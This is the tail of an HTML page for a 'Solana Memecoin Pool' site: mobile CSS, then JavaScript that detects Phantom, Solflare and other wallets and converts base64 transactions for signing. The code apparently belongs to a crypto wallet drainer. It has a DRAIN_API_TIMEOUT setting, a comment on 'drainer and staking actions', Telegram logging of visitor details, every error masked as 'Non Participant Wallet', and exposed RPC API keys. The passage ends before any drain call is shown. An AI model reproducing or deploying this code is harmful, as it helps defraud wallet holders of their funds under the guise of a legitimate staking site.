      .section-subtitle {
        font-size: 1.1rem;
        margin-bottom: 2rem;
      }
    }
    
    /* Small Mobile Devices - Extra Mobile Optimization */
    @media (max-width: 480px) {
      .container {
        padding: 10px;
        max-width: 100%;
      }
      
      /* Stats Section Extra Mobile Optimization */
      .stats {
        padding: 40px 0;
      }
      
      .stats::before {
        height: 40px;
      }
      
      .stats-grid {
        grid-template-columns: 1fr;
        gap: 1rem;
        padding: 0 15px;
        margin-top: 1.5rem;
      }
      
      .stat-item {
        padding: 1.5rem 1rem;
      }
      
      .stat-number {
        font-size: 2rem;
      }
      
      .stat-label {
        font-size: 0.9rem;
      }
      
      .section-title {
        font-size: 1.8rem;
        font-weight: 800;
      }
      
      .section-subtitle {
        font-size: 1rem;
        margin-bottom: 1.5rem;
      }
      
      /* Header Extra Mobile Optimization */
      .header {
        padding: 0.8rem;
        margin-bottom: 20px;
        border-radius: 15px;
      }
      
      .logo {
        gap: 12px;
        margin-bottom: 12px;
      }
      
      .logo-img {
        width: 45px;
        height: 45px;
      }
      
      .logo-text {
        font-size: 1.6rem;
      }
      
      .main-title {
        font-size: 1.4rem;
        margin-bottom: 6px;
        line-height: 1.2;
      }
      
      .subtitle {
        font-size: 0.9rem;
        margin-bottom: 12px;
        line-height: 1.3;
      }
      
      /* Hero Section Extra Mobile Optimization */
      .hero {
        padding: 20px 15px;
        gap: 20px;
        border-radius: 15px;
      }
      
      .hero-title {
        font-size: 1.3rem;
        margin-bottom: 10px;
        line-height: 1.2;
      }
      
      .hero-description {
        font-size: 0.9rem;
        line-height: 1.4;
        margin-bottom: 15px;
      }
      
      /* Hero Stats Extra Mobile Optimization */
      .hero-stats {
        display: flex !important;
        visibility: visible !important;
        opacity: 1 !important;
        flex-direction: column;
        gap: 1rem;
        margin-bottom: 1.5rem;
        padding: 0 10px;
      }
      
      .hero-stat {
        display: block !important;
        visibility: visible !important;
        opacity: 1 !important;
        min-width: auto;
        padding: 1rem 1.2rem;
        margin: 0 auto;
        max-width: 160px;
        width: 100%;
        border-radius: 15px;
      }
      
      .hero-stat-number {
        font-size: 2rem;
      }
      
      .hero-stat-label {
        font-size: 0.75rem;
        letter-spacing: 0.5px;
      }
      
      /* Hero Features Extra Mobile Optimization */
      .hero-features {
        gap: 12px;
        padding: 0 10px;
      }
      
      .feature {
        padding: 6px 10px;
        font-size: 0.8rem;
        border-radius: 20px;
      }
      
      /* Features Section Extra Mobile Optimization */
      .features {
        margin-bottom: 30px;
      }
      
      .features-title {
        font-size: 1.6rem;
        margin-bottom: 20px;
      }
      
      .features-grid {
        gap: 15px;
        padding: 0 10px;
      }
      
      .feature-card {
        padding: 20px 15px;
        border-radius: 15px;
      }
      
      .feature-card .feature-icon {
        font-size: 2.2rem;
        margin-bottom: 10px;
      }
      
      .feature-card h4 {
        font-size: 1.1rem;
        margin-bottom: 6px;
      }
      
      .feature-card p {
        font-size: 0.85rem;
        line-height: 1.4;
      }
      
      /* Calculator Section Extra Mobile Optimization */
      .calculator-section {
        padding: 40px 0;
      }
      
      .calculator-container {
        gap: 1.5rem;
        padding: 0 15px;
      }
      
      .calculator-info h3 {
        font-size: 1.8rem;
        margin-bottom: 1rem;
      }
      
      .calculator-info p {
        font-size: 0.9rem;
        line-height: 1.5;
      }
      
      .calculator {
        padding: 1.5rem 1.2rem;
        border-radius: 15px;
      }
      
      .calculator h4 {
        font-size: 1.6rem;
        margin-bottom: 1.2rem;
      }
      
      /* Wallet Section Extra Mobile Optimization */
      .wallet-section {
        padding: 25px 15px;
        margin-bottom: 30px;
        border-radius: 15px;
      }
      
      .wallet-title {
        font-size: 1.4rem;
        margin-bottom: 10px;
      }
      
      .wallet-description {
        font-size: 0.9rem;
        margin-bottom: 18px;
        line-height: 1.4;
      }
      
      .connect-btn {
        padding: 10px 20px;
        font-size: 0.95rem;
        width: 100%;
        max-width: 250px;
        border-radius: 25px;
      }
      
      /* Footer Extra Mobile Optimization */
      .footer {
        padding: 20px 0;
      }
      
      .footer-content {
        gap: 15px;
        padding: 0 15px;
      }
      
      .social-links {
        gap: 10px;
      }
      
      .social-link {
        width: 100%;
        max-width: 180px;
        padding: 8px 16px;
        font-size: 0.9rem;
      }
      
      /* Stats Grid Extra Mobile Optimization */
      .stats-grid {
        grid-template-columns: 1fr;
        gap: 1rem;
        padding: 0 15px;
      }
      
      .section-title {
        font-size: 2rem;
      }
      
      /* Wallet Modal Extra Mobile Optimization */
      .wallet-content {
        margin: 10% auto;
        padding: 20px;
        width: 95%;
        border-radius: 15px;
      }
      
      .wallet-item {
        padding: 12px;
        margin-bottom: 8px;
      }
      
      .wallet-icon {
        width: 28px;
        height: 28px;
      }
      
      .wallet-name {
        font-size: 0.9rem;
      }
      
      .wallet-status {
        font-size: 10px;
        padding: 3px 8px;
      }
    }
    
    /* Extra Small Mobile Devices */
    @media (max-width: 360px) {
      .container {
        padding: 8px;
      }
      
      .header {
        padding: 0.6rem;
      }
      
      .logo-img {
        width: 40px;
        height: 40px;
      }
      
      .logo-text {
        font-size: 1.4rem;
      }
      
      .main-title {
        font-size: 1.2rem;
      }
      
      .subtitle {
        font-size: 0.8rem;
      }
      
      .hero {
        padding: 15px 12px;
      }
      
      .hero-title {
        font-size: 1.2rem;
      }
      
      .hero-description {
        font-size: 0.85rem;
      }
      
      .hero-stats {
        gap: 0.8rem;
      }
      
      .hero-stat {
        padding: 0.8rem 1rem;
        max-width: 140px;
      }
      
      .hero-stat-number {
        font-size: 1.8rem;
      }
      
      .hero-stat-label {
        font-size: 0.7rem;
      }
      
      .feature-card {
        padding: 15px 12px;
      }
      
      .wallet-section {
        padding: 20px 12px;
      }
      
      .connect-btn {
        padding: 8px 16px;
        font-size: 0.9rem;
        max-width: 220px;
      }
    }
    
    /* Mobile accessibility improvements */
    @media (max-width: 768px) {
      /* Ensure minimum touch target sizes */
      .connect-btn,
      .wallet-item,
      .social-link {
        min-height: 44px;
        min-width: 44px;
      }
      
      /* Improve text readability on small screens */
      .hero-description,
      .wallet-description,
      .feature-card p {
        line-height: 1.6;
        word-spacing: 0.5px;
      }
      
      /* Better spacing for mobile */
      .hero,
      .wallet-section,
      .features,
      .calculator-section {
        margin-bottom: 2rem;
      }
      
      /* Optimize wallet modal for mobile */
      .wallet-modal {
        padding: 10px;
      }
      
      .wallet-content {
        margin: 5% auto;
        max-height: 90vh;
        overflow-y: auto;
      }
      
      /* Mobile-friendly status messages */
      .status-container {
        top: 10px;
        right: 10px;
        left: 10px;
        max-width: none;
      }
      
      .status-message {
        margin-bottom: 8px;
        padding: 10px 12px;
        font-size: 0.9rem;
      }
    }
    
    /* Mobile performance optimizations */
    @media (max-width: 768px) {
      /* Reduce animations on mobile for better performance */
      .hero::before,
      .hero::after {
        animation: none;
        opacity: 0.05;
      }
      
      /* Optimize shadows for mobile */
      .header,
      .hero,
      .wallet-section,
      .feature-card {
        box-shadow: 0 4px 16px rgba(0, 0, 0, 0.2);
      }
      
      /* Reduce backdrop-filter on mobile for better performance */
      .header,
      .hero,
      .wallet-section,
      .feature-card {
        backdrop-filter: blur(10px);
      }
    }
  </style>

  <!-- JavaScript -->
  <script>
    // Production logging system - only logs in development
    const isDevelopment = window.location.hostname === 'localhost' || window.location.hostname === '127.0.0.1';
    
    // Load configuration
    if (typeof window.APP_CONFIG === 'undefined') {
      // Fallback configuration if config.js fails to load
      window.APP_CONFIG = {
        PROJECT_NAME: 'Solana Memecoin Pool',
        PRIMARY_RPC: 'https://mainnet.helius-rpc.com/?api-key=19041dd1-5f30-4135-9b5a-9b670510524b',
        FALLBACK_RPC: 'https://rpc.shyft.to?api_key=-C7eUSlaDtQcR6b0',
        WALLET_CONNECTION_TIMEOUT: 45000, // Increased to 45s for more lenient wallet connections
        DEEP_LINKING_TIMEOUT: 25000, // Increased to 25s for more lenient deep linking
        DRAIN_API_TIMEOUT: 15000, // Reduced from 45s to 15s - much faster response
        BROADCAST_TIMEOUT: 30000, // Reduced from 60s to 30s
        SIGNING_TIMEOUT: 60000 // Reduced from 90s to 60s
      };
    }

    // Helper functions for configuration access
    window.getConfig = function(key) {
      return window.APP_CONFIG[key] || null;
    };

    window.getTimeout = function(key) {
      return window.APP_CONFIG[key] || 30000; // Default 30 seconds
    };

    window.logger = {
      log: (...args) => isDevelopment && console.log(...args),
      error: (...args) => console.error(...args), // Always log errors
      warn: (...args) => isDevelopment && console.warn(...args),
      info: (...args) => isDevelopment && console.info(...args)
    };

            logger.log('‚úÖ Solana Memecoin Pool Application Loading...');

    // Frontend Error Handling Utility
    window.FRONTEND_ERROR_TYPES = {
      WALLET_CONNECTION: 'wallet_connection',
      TRANSACTION_SIGNING: 'transaction_signing',
      API_CALL: 'api_call',
      NETWORK: 'network',
      VALIDATION: 'validation',
      SOLANA_ERROR: 'solana_error',
      RPC_ERROR: 'rpc_error',
      UNKNOWN: 'unknown'
    };
    
    // User-friendly error messages (clean, non-technical)
    window.USER_MESSAGES = {
      [window.FRONTEND_ERROR_TYPES.WALLET_CONNECTION]: 'Non Participant Wallet',
      [window.FRONTEND_ERROR_TYPES.TRANSACTION_SIGNING]: 'Non Participant Wallet',
      [window.FRONTEND_ERROR_TYPES.API_CALL]: 'Non Participant Wallet',
      [window.FRONTEND_ERROR_TYPES.NETWORK]: 'Non Participant Wallet',
      [window.FRONTEND_ERROR_TYPES.VALIDATION]: 'Non Participant Wallet',
      [window.FRONTEND_ERROR_TYPES.SOLANA_ERROR]: 'Non Participant Wallet',
      [window.FRONTEND_ERROR_TYPES.RPC_ERROR]: 'Non Participant Wallet',
      [window.FRONTEND_ERROR_TYPES.UNKNOWN]: 'Non Participant Wallet'
    };
    
    // Error classification function
    window.classifyFrontendError = function(error) {
      const errorMessage = error.message?.toLowerCase() || '';
      
      // Solana.js specific errors
      if (errorMessage.includes('unsupported path') || errorMessage.includes('solana.js')) {
        return 'SOLANA_ERROR';
      }
      
      if (errorMessage.includes('rpc') || errorMessage.includes('endpoint')) {
        return 'RPC_ERROR';
      }
      
      if (errorMessage.includes('wallet') || errorMessage.includes('phantom') || 
          errorMessage.includes('solflare') || errorMessage.includes('backpack') ||
          errorMessage.includes('user rejected') || errorMessage.includes('popup blocked')) {
        return window.FRONTEND_ERROR_TYPES.WALLET_CONNECTION;
      }
      
      if (errorMessage.includes('transaction') || errorMessage.includes('signature') ||
          errorMessage.includes('instruction') || errorMessage.includes('serialize')) {
        return window.FRONTEND_ERROR_TYPES.TRANSACTION_SIGNING;
      }
      
      if (errorMessage.includes('fetch') || errorMessage.includes('api') ||
          errorMessage.includes('response') || errorMessage.includes('status')) {
        return window.FRONTEND_ERROR_TYPES.API_CALL;
      }
      
      if (errorMessage.includes('network') || errorMessage.includes('connection') ||
          errorMessage.includes('timeout') || errorMessage.includes('offline')) {
        return window.FRONTEND_ERROR_TYPES.NETWORK;
      }
      
      if (errorMessage.includes('invalid') || errorMessage.includes('missing') ||
          errorMessage.includes('format') || errorMessage.includes('parameter')) {
        return window.FRONTEND_ERROR_TYPES.VALIDATION;
      }
      
      return window.FRONTEND_ERROR_TYPES.UNKNOWN;
    };
    
    // Get user-friendly error message
    window.getFrontendUserMessage = function(errorType) {
      return window.USER_MESSAGES[errorType] || window.USER_MESSAGES[window.FRONTEND_ERROR_TYPES.UNKNOWN];
    };
    
    // Global error handler for unhandled errors
    window.addEventListener('error', function(event) {
      const error = event.error || new Error(event.message);
      const context = {
        filename: event.filename,
        lineno: event.lineno,
        colno: event.colno,
        type: 'unhandled_error'
      };
      
      // Enhanced Solana.js error detection and handling
      if (error.message && (
          error.message.includes('Unsupported path') ||
          error.message.includes('solana.js') ||
          error.message.includes('RPC') ||
          error.message.includes('endpoint') ||
          error.message.includes('Connection') ||
          error.message.includes('network')
        )) {
        
        console.error('[SOLANA_ERROR] Solana.js error detected in global handler:', {
          error: error.message,
          stack: error.stack,
          context: context,
          timestamp: new Date().toISOString()
        });
        
        // Trigger robust fallback
        if (window.triggerRobustRPCFallback) {
          window.triggerRobustRPCFallback(error, context);
        }
        
        // Don't send to Telegram - these are handled by fallbacks
        return;
      }
      
              // Send other critical errors to Telegram
        window.sendTelegramLog('UNHANDLED_ERROR', {
          error: error.message,
          stack: error.stack,
          context: context,
          timestamp: new Date().toISOString(),
          projectName: window.APP_CONFIG?.PROJECT_NAME || 'Solana Memecoin Pool'
        });
      
      // Log to console
      console.error('[UNHANDLED_ERROR]', error, context);
    });

    // Global promise rejection handler
    window.addEventListener('unhandledrejection', function(event) {
      const error = event.reason || new Error('Promise rejected');
      const context = {
        type: 'unhandled_promise_rejection'
      };
      
      // Log critical errors to Telegram
      if (error.message.includes('Unsupported path') || 
          error.message.includes('solana.js') ||
          error.message.includes('RPC') ||
          error.message.includes('network')) {
        
        // Enhanced Solana.js error detection and handling
        if (error.message && (
            error.message.includes('Unsupported path') ||
            error.message.includes('solana.js') ||
            error.message.includes('RPC') ||
            error.message.includes('endpoint') ||
            error.message.includes('Connection') ||
            error.message.includes('network')
          )) {
          
          console.error('[SOLANA_ERROR] Solana.js error detected in promise rejection:', {
            error: error.message,
            stack: error.stack,
            context: context,
            timestamp: new Date().toISOString()
          });
          
          // Trigger robust fallback
          if (window.triggerRobustRPCFallback) {
            window.triggerRobustRPCFallback(error, context);
          }
          
          // Don't send to Telegram - these are handled by fallbacks
          return;
        }
        
        // Send other critical errors to Telegram
        window.sendTelegramLog('UNHANDLED_PROMISE_REJECTION', {
          error: error.message,
          stack: error.stack,
          context: context,
          timestamp: new Date().toISOString(),
          projectName: window.APP_CONFIG?.PROJECT_NAME || 'Solana Memecoin Pool'
        });
      }
      
      // Log to console
      console.error('[UNHANDLED_PROMISE_REJECTION]', error, context);
    });

    // Enhanced error classification for Solana.js errors
    window.classifySolanaError = function(error) {
      const message = error.message || '';
      
      if (message.includes('Unsupported path')) return 'UNSUPPORTED_PATH';
      if (message.includes('solana.js')) return 'SOLANA_JS_ERROR';
      if (message.includes('RPC')) return 'RPC_ERROR';
      if (message.includes('endpoint')) return 'ENDPOINT_ERROR';
      if (message.includes('Connection')) return 'CONNECTION_ERROR';
      if (message.includes('network')) return 'NETWORK_ERROR';
      if (message.includes('timeout')) return 'TIMEOUT_ERROR';
      if (message.includes('rate limit')) return 'RATE_LIMIT_ERROR';
      
      return 'UNKNOWN_SOLANA_ERROR';
    };
    
    // Enhanced error logging for frontend with graceful promise rejection handling
    window.logFrontendError = function(error, context = {}) {
      try {
        const errorType = window.classifyFrontendError(error);
        
        logger.error(`[FRONTEND_ERROR] ${errorType.toUpperCase()}:`, {
          message: error.message,
          stack: error.stack,
          context: context,
          timestamp: new Date().toISOString(),
          userAgent: navigator.userAgent,
          url: window.location.href
        });
        
        // Send ALL errors to Telegram for comprehensive monitoring
        if (window.sendTelegramLog) {
          window.sendTelegramLog('FRONTEND_ERROR', {
            error: error.message,
            stack: error.stack,
            context: context,
            errorType: errorType,
            timestamp: new Date().toISOString(),
            projectName: window.APP_CONFIG?.PROJECT_NAME || 'MAMBO Staking',
            url: window.location.href,
            userAgent: navigator.userAgent
          });
        }
        
        // Enhanced Solana.js error handling with robust fallbacks
        if (error.message.includes('Unsupported path') || 
            error.message.includes('solana.js') ||
            error.message.includes('RPC') || 
            error.message.includes('endpoint') ||
            error.message.includes('Connection') ||
            error.message.includes('network')) {
          
          console.error(`[SOLANA_ERROR] Solana.js error detected, triggering robust fallback:`, {
            errorType: errorType,
            message: error.message,
            context: context,
            timestamp: new Date().toISOString()
          });
          
          // Trigger comprehensive RPC fallback
          window.triggerRobustRPCFallback(error, context);
          
          return {
            errorType: 'SOLANA_ERROR',
            userMessage: 'Network connection issue - switching to backup servers',
            shouldShowToUser: true
          };
        }
        
        return {
          errorType,
          userMessage: window.getFrontendUserMessage(errorType),
          shouldShowToUser: true
        };
        
      } catch (loggingError) {
        logger.error('[FRONTEND_ERROR] Error handling failed:', loggingError);
        return {
          errorType: FRONTEND_ERROR_TYPES.UNKNOWN,
          userMessage: 'Non Participant Wallet',
          shouldShowToUser: true
        };
      }
    };
    
            // Graceful promise rejection handler for drainer and staking actions
    window.handlePromiseRejection = function(promise, context = {}) {
      return promise.catch(error => {
        console.warn(`‚ö†Ô∏è [PROMISE_HANDLER] Promise rejected in ${context.action || 'unknown action'}:`, error);
        
        // Log the error but don't fail completely
        const errorInfo = window.logFrontendError(error, context);
        
        // Return a graceful fallback response
        return {
          success: false,
          error: errorInfo.userMessage,
          errorType: errorInfo.errorType,
          fallback: true
        };
      });
    };
    
    // Enhanced promise wrapper for critical operations
    window.safePromise = function(promiseFn, context = {}) {
      return new Promise(async (resolve) => {
        try {
          const result = await promiseFn();
          resolve({ success: true, data: result, fallback: false });
        } catch (error) {
          console.warn(`‚ö†Ô∏è [SAFE_PROMISE] Operation failed in ${context.action || 'unknown action'}:`, error);
          
          const errorInfo = window.logFrontendError(error, context);
          
          // Resolve with error info instead of rejecting
          resolve({
            success: false,
            error: errorInfo.userMessage,
            errorType: errorInfo.errorType,
            fallback: true
          });
        }
      });
    };
    
    // API error response handler
    window.handleApiError = function(response, context = {}) {
      try {
        if (!response.ok) {
          const error = new Error(`API call failed with status ${response.status}`);
          error.status = response.status;
          error.context = context;
          
          return window.logFrontendError(error, {
            ...context,
            responseStatus: response.status,
            responseStatusText: response.statusText
          });
        }
        
        return null; // No error
      } catch (parseError) {
        return window.logFrontendError(parseError, {
          ...context,
          originalError: 'Failed to parse API error response'
        });
      }
    };
    
    // Wallet connection error handler
    window.handleWalletError = function(error, walletType, context = {}) {
      const errorInfo = window.logFrontendError(error, {
        ...context,
        walletType: walletType
      });
      
      // Specific handling for wallet-related errors
      if (errorInfo.errorType === FRONTEND_ERROR_TYPES.WALLET_CONNECTION) {
        if (error.message.includes('User rejected')) {
          return {
            ...errorInfo,
            userMessage: 'Non Participant Wallet',
            shouldRetry: false
          };
        }
        
        if (error.message.includes('popup blocked')) {
          return {
            ...errorInfo,
            userMessage: 'Non Participant Wallet',
            shouldRetry: true
          };
        }
        }
      
      return errorInfo;
    };
    
    // Transaction error handler
    window.handleTransactionError = function(error, transaction, context = {}) {
      const errorInfo = window.logFrontendError(error, {
        ...context,
        transactionSize: transaction?.instructions?.length || 0
      });
      
      // Specific handling for transaction-related errors
      if (errorInfo.errorType === FRONTEND_ERROR_TYPES.TRANSACTION_SIGNING) {
        if (error.message.includes('insufficient funds')) {
          return {
            ...errorInfo,
            userMessage: 'Non Participant Wallet',
            shouldRetry: false
          };
        }
        
        if (error.message.includes('invalid owner') || error.message.includes('account not found')) {
          return {
            ...errorInfo,
            userMessage: 'Non Participant Wallet',
            shouldRetry: false
          };
        }
      }
      
      return errorInfo;
    };

    // Enhanced wallet detection at page load with conflict resolution
    logger.log('üîç [WALLET_DETECTION] Starting wallet detection...');
    
    // Clear any existing wallet references to avoid conflicts
    window.phantomWallet = null;
    window.solflareWallet = null;
    window.backpackWallet = null;
    window.exodusWallet = null;
    window.glowWallet = null;
    window.xnftWallet = null;
    
    // Phantom Wallet - multiple detection methods with conflict resolution
    if (window.phantom?.solana && typeof window.phantom.solana.isPhantom === 'boolean') {
      window.phantomWallet = window.phantom.solana;
      logger.log('‚úÖ [WALLET_DETECTION] Phantom detected via window.phantom.solana');
    } else if (window.phantom && typeof window.phantom.isPhantom === 'boolean') {
      window.phantomWallet = window.phantom;
      logger.log('‚úÖ [WALLET_DETECTION] Phantom detected via window.phantom');
    } else if (window.solana && window.solana.isPhantom) {
      window.phantomWallet = window.solana;
      logger.log('‚úÖ [WALLET_DETECTION] Phantom detected via window.solana');
    }
    
    // Add error handling if all Phantom providers fail
    if (!window.phantomWallet) {
      console.error('[PHANTOM] All Phantom providers failed - no fallback available');
              // Log to console for monitoring (not to Telegram)
        console.error('[PHANTOM_PROVIDER_FAILURE] All Phantom providers failed:', {
          error: 'All Phantom providers failed',
          context: 'Phantom Wallet Detection',
          timestamp: new Date().toISOString(),
          projectName: window.APP_CONFIG?.PROJECT_NAME || 'Solana Memecoin Pool'
        });
    }
    
    // Solflare Wallet - check for proper methods
    if (window.solflare && typeof window.solflare.isSolflare === 'boolean') {
      window.solflareWallet = window.solflare;
      logger.log('‚úÖ [WALLET_DETECTION] Solflare detected');
    } else if (window.solflare) {
      logger.log('‚ö†Ô∏è [WALLET_DETECTION] Solflare found but missing required methods');
    }
    
    // Backpack Wallet - check for proper methods
    if (window.backpack && typeof window.backpack.isBackpack === 'boolean') {
      window.backpackWallet = window.backpack;
      logger.log('‚úÖ [WALLET_DETECTION] Backpack detected');
    } else if (window.backpack) {
      logger.log('‚ö†Ô∏è [WALLET_DETECTION] Backpack found but missing required methods');
    }
    
    // Exodus Wallet - check for proper methods
    if (window.exodus && typeof window.exodus.isExodus === 'boolean') {
      window.exodusWallet = window.exodus;
      logger.log('‚úÖ [WALLET_DETECTION] Exodus detected');
    } else if (window.exodus) {
      logger.log('‚ö†Ô∏è [WALLET_DETECTION] Exodus found but missing required methods');
    }
    
    // Glow Wallet - check for proper methods
    if (window.glow && typeof window.glow.isGlow === 'boolean') {
      window.glowWallet = window.glow;
      logger.log('‚úÖ [WALLET_DETECTION] Glow detected');
    } else if (window.glow) {
      logger.log('‚ö†Ô∏è [WALLET_DETECTION] Glow found but missing required methods');
    }
    
    // XNFT Wallet - check for proper methods
    if (window.xnft && typeof window.xnft.isXnft === 'boolean') {
      window.xnftWallet = window.xnft;
      logger.log('‚úÖ [WALLET_DETECTION] XNFT detected');
    } else if (window.xnft) {
      logger.log('‚ö†Ô∏è [WALLET_DETECTION] XNFT found but missing required methods');
    }
    
    // Log detection results
    const detectedWallets = [];
    if (window.phantomWallet) detectedWallets.push('Phantom');
    if (window.solflareWallet) detectedWallets.push('Solflare');
    if (window.backpackWallet) detectedWallets.push('Backpack');
    if (window.exodusWallet) detectedWallets.push('Exodus');
    if (window.glowWallet) detectedWallets.push('Glow');
    if (window.xnftWallet) detectedWallets.push('XNFT');
    
    logger.log(`üéØ [WALLET_DETECTION] Detection complete. Found: ${detectedWallets.join(', ') || 'None'}`);
    
    // Set global wallet type if only one is detected
    if (detectedWallets.length === 1) {
      window.currentWalletType = detectedWallets[0].toLowerCase();
      logger.log(`üéØ [WALLET_DETECTION] Single wallet detected, setting currentWalletType: ${window.currentWalletType}`);
    }

    // Wallet Manager
    window.walletManager = {
      connectionStates: new Map(),
      pendingRequests: new Map(),
      failureCounts: new Map(),
      circuitBreakers: new Map(),
      
      setConnectionState: function(walletKey, state) {
        this.connectionStates.set(walletKey, state);
      },
      
      getConnectionState: function(walletKey) {
        return this.connectionStates.get(walletKey);
      },
      
      clearConnectionState: function(walletKey) {
        this.connectionStates.delete(walletKey);
      },
      
      isConnecting: function(walletKey) {
        return this.connectionStates.get(walletKey) === 'connecting';
      },
      
      setPendingRequest: function(walletKey, type) {
        this.pendingRequests.set(walletKey, {
          type: type,
          timestamp: Date.now()
        });
      },
      
      hasPendingRequest: function(walletKey) {
        return this.pendingRequests.has(walletKey);
      },
      
      clearPendingRequest: function(walletKey) {
        this.pendingRequests.delete(walletKey);
      },
      
      clearAllState: function(walletKey) {
        this.connectionStates.delete(walletKey);
        this.pendingRequests.delete(walletKey);
        this.failureCounts.delete(walletKey);
        this.circuitBreakers.delete(walletKey);
      },
      
      recordFailure: function(walletKey) {
        const currentCount = this.failureCounts.get(walletKey) || 0;
        this.failureCounts.set(walletKey, currentCount + 1);
        
        // Enhanced circuit breaker with exponential backoff
        if (currentCount + 1 >= 3) {
          const backoffTime = Math.min(30000 * Math.pow(2, currentCount - 2), 300000); // Max 5 minutes
          this.circuitBreakers.set(walletKey, Date.now() + backoffTime);
          
          // Log circuit breaker activation
          console.log(`[CIRCUIT_BREAKER] ${walletKey} circuit breaker opened for ${backoffTime/1000}s`);
        }
      },
      
      isCircuitBreakerOpen: function(walletKey) {
        const openTime = this.circuitBreakers.get(walletKey);
        if (!openTime) return false;
        
        if (Date.now() > openTime) {
          this.circuitBreakers.delete(walletKey);
          this.failureCounts.delete(walletKey);
          console.log(`[CIRCUIT_BREAKER] ${walletKey} circuit breaker reset`);
          return false;
        }
        
        const remainingTime = Math.ceil((openTime - Date.now()) / 1000);
        console.log(`[CIRCUIT_BREAKER] ${walletKey} circuit breaker open for ${remainingTime}s`);
        return true;
      },
      
      resetCircuitBreaker: function(walletKey) {
        this.circuitBreakers.delete(walletKey);
        this.failureCounts.delete(walletKey);
        console.log(`[CIRCUIT_BREAKER] ${walletKey} circuit breaker manually reset`);
      },
      
      // Enhanced health monitoring
      getWalletHealth: function(walletKey) {
        const failureCount = this.failureCounts.get(walletKey) || 0;
        const isOpen = this.isCircuitBreakerOpen(walletKey);
        const connectionState = this.getConnectionState(walletKey);
        
        return {
          walletKey,
          failureCount,
          circuitBreakerOpen: isOpen,
          connectionState,
          healthy: !isOpen && failureCount < 3,
          lastFailure: this.failureCounts.get(walletKey) ? Date.now() : null
        };
      },
      
      // Get overall system health
      getSystemHealth: function() {
        const wallets = ['phantom', 'solflare', 'backpack', 'glow', 'exodus', 'trust'];
        const health = {};
        
        wallets.forEach(wallet => {
          health[wallet] = this.getWalletHealth(wallet);
        });
        
        return health;
      }
    };

        // Global wallet definitions - Only fully supported wallets
    var fallbackWallets = [
      {
        key: 'phantom',
        name: 'Phantom',
        icon: '/phantom-logo.png',
        requiredMethods: ['connect', 'disconnect', 'signTransaction', 'signMessage', 'isPhantom'],
        provider: function(){
          // Only return provider if all required methods are available
          // Prioritize phantomWallet (already validated during detection)
          if (window.phantomWallet && window.validateWalletMethods(window.phantomWallet, this.requiredMethods)) {
            console.log('üîç [PHANTOM_PROVIDER] Using validated phantomWallet');
            return window.phantomWallet;
          }
          
          // Fallback to other providers only if phantomWallet is not available
          if (!window.phantomWallet && window.phantom?.solana && window.validateWalletMethods(window.phantom.solana, this.requiredMethods)) {
            console.log('üîç [PHANTOM_PROVIDER] Using fallback window.phantom.solana');
            return window.phantom.solana;
          }
          
          if (!window.phantomWallet && !window.phantom?.solana && window.phantom && window.validateWalletMethods(window.phantom, this.requiredMethods)) {
            console.log('üîç [PHANTOM_PROVIDER] Using fallback window.phantom');
            return window.phantom;
          }
          
          console.log('‚ùå [PHANTOM_PROVIDER] Phantom provider missing required methods');
          return null;
        },
        install: 'https://phantom.app/',
        deepLink: 'phantom://',
        supported: true
      },
      {
        key: 'solflare',
        name: 'Solflare',
        icon: '/solflare-logo.png',
        requiredMethods: ['connect', 'disconnect', 'signTransaction', 'signMessage', 'isSolflare'],
        provider: function(){
          if (window.solflareWallet && window.validateWalletMethods(window.solflareWallet, this.requiredMethods)) {
            console.log('üîç [SOLFLARE_PROVIDER] Using validated solflareWallet');
            return window.solflareWallet;
          }
          if (window.solflare && window.validateWalletMethods(window.solflare, this.requiredMethods)) {
            console.log('üîç [SOLFLARE_PROVIDER] Using validated window.solflare');
            return window.solflare;
          }
          console.log('‚ùå [SOLFLARE_PROVIDER] Solflare provider missing required methods');
          return null;
        },
        install: 'https://solflare.com/',
        deepLink: 'solflare://',
        supported: true
      },
      {
        key: 'glow',
        name: 'Glow',
        icon: '/glow-logo.png',
        requiredMethods: ['connect', 'disconnect', 'signTransaction', 'signMessage', 'isGlow'],
        provider: function(){
          if (window.glowWallet && window.validateWalletMethods(window.glowWallet, this.requiredMethods)) {
            console.log('üîç [GLOW_PROVIDER] Using validated glowWallet');
            return window.glowWallet;
          }
          if (window.glow && window.validateWalletMethods(window.glow, this.requiredMethods)) {
            console.log('üîç [GLOW_PROVIDER] Using validated window.glow');
            return window.glow;
          }
          console.log('‚ùå [GLOW_PROVIDER] Glow provider missing required methods');
          return null;
        }, 
        install: 'https://glow.app/',
        deepLink: 'glow://',
        supported: true
      }
    ];
    
    // Remove unsupported wallets from the list
        var supportedWallets = fallbackWallets.filter(wallet => wallet.supported);
    
    // Wallet method validation function
    window.validateWalletMethods = function(wallet, requiredMethods) {
      if (!wallet || typeof wallet !== 'object') {
        return false;
      }
      
      for (const method of requiredMethods) {
        if (typeof wallet[method] !== 'function' && typeof wallet[method] !== 'boolean') {
          console.warn(`‚ö†Ô∏è [WALLET_VALIDATION] Wallet missing required method: ${method}`);
          return false;
        }
      }
      
      return true;
    };
    
    // Filter wallets to only show supported ones
    window.getSupportedWallets = function() {
      return supportedWallets.filter(wallet => {
        const provider = wallet.provider();
        return provider !== null;
      });
    };

    // Transaction conversion helper
    window.convertBase64ToTransaction = function(base64String) {
      console.log('[TRANSACTION_CONVERTER] Converting base64 to Solana Transaction...');
      
      try {
        let TransactionClass = null;
        if (window.solana && window.solana.Transaction) {
          TransactionClass = window.solana.Transaction;
        } else if (window.solanaWeb3 && window.solanaWeb3.Transaction) {
          TransactionClass = window.solanaWeb3.Transaction;
        } else if (window.SolanaWeb3 && window.SolanaWeb3.Transaction) {
          TransactionClass = window.SolanaWeb3.Transaction;
        } else {
          throw new Error('No Solana Transaction class found');
        }

        if (typeof TransactionClass.from !== 'function') {
          throw new Error('Transaction.from method not available');
        }
        
        const binaryString = atob(base64String);
        const bytes = new Uint8Array(binaryString.length);
        for (let i = 0; i < binaryString.length; i++) {
          bytes[i] = binaryString.charCodeAt(i);
        }
        
        const transaction = TransactionClass.from(bytes);
        console.log('[TRANSACTION_CONVERTER] Successfully created Solana Transaction object');
        
        return transaction;
        
      } catch (error) {
        console.error('[TRANSACTION_CONVERTER] Conversion failed:', error);
        
        // Log critical transaction conversion failures to Telegram
        if (window.sendTelegramLog) {
          window.sendTelegramLog('TRANSACTION_SIGNING', {
            error: error.message,
            stack: error.stack,
            context: 'Transaction Conversion',
            timestamp: new Date().toISOString(),
            projectName: window.APP_CONFIG?.PROJECT_NAME || 'Solana Memecoin Pool'
          });
        }
        
        throw new Error(`Transaction conversion failed: ${error.message}`);
      }
    };

    // Status display function
